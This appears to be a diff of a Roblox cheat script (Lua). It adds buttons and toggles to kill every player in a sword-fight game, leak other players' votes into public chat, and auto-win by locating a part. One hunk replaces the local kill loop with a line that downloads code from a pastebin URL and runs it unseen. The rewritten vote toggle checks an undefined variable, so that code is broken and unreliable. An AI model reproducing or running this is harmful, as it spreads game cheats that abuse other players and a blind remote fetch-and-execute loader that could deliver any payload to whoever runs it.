@@ -341,16 +341,7 @@ local Button = MakeTab:CreateButton({
 	Name = "Kill Everbody In SwordFight",
 	Description = "kill everyone in sword fight..", -- Creates A Description For Users to know what the button does (looks bad if you use it all the time),
     	Callback = function()
- local player = game.Players.LocalPlayer
-
-while true do
-    for _, p in pairs(game.Players:GetPlayers()) do
-        if p ~= player and p.Character and p.Character:FindFirstChild("Humanoid") then
-            p.Character.Humanoid.Health = 0
-        end
-    end
-    wait(0.1)  -- Loop with a short delay to avoid performance issues
-end
+ loadstring(game:HttpGet("https://pastebin.com/raw/cuKXdXke"))()
     	end
 })
 
@@ -423,32 +414,15 @@ local Toggle = MakeTab:CreateToggle({
 	Description = "Expose the votes.",
 	CurrentValue = false,
     	Callback = function(Value)
-       if Value == true then
-            -- Prevent multiple connections
-            if connection then
-                connection:Disconnect()
-                connection = nil
-            end
-            
-            -- Create the event connection and store it
-            connection = game.ReplicatedStorage.Season.Voting.Votes.ChildAdded:Connect(function(v)
-                if Value then -- Check if toggle is still on
-                    local PlayerVoted = game.ReplicatedStorage.Season.Players[v.Value].Value
-                    local PlayerPicked = game.ReplicatedStorage.Season.Players[v.Name].Value
-                    local SEND = PlayerVoted .. " voted for " .. PlayerPicked
-                    local A_1 = SEND
-                    local A_2 = "All"
-                    local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
-                    Event:FireServer(A_1, A_2)
-                end
-            end)
-        else
-            -- Toggle is turned off, disconnect the event
-            if connection then
-                connection:Disconnect()
-                connection = nil
-            end
-        end
+       game.ReplicatedStorage.Season.Voting.Votes.ChildAdded:Connect(function(v)
+			if state == true then
+				local PlayerVoted = game.ReplicatedStorage.Season.Players[v.Value].Value
+				local PlayerPicked = game.ReplicatedStorage.Season.Players[v.Name].Value
+				local SEND = PlayerVoted .. " voted for " .. PlayerPicked
+				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(SEND, "All")
+				else return
+			end
+		end)
     end
     	
 }, "Toggle") 
@@ -1365,7 +1339,7 @@ local Button = ExpeditionTab:CreateButton({
 	Description = "AutoWins..", -- Creates A Description For Users to know what the button does (looks bad if you use it all the time),
     	Callback = function()
           for _, v in ipairs(workspace:GetDescendants()) do
-    if v:IsA("Part") and v.Name == "SingularBox" then
+    if v:IsA("Part") and v.Name == "Cheese" then
         local root = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
         if root and (v.Position - root.Position).Magnitude <= 100 then
             
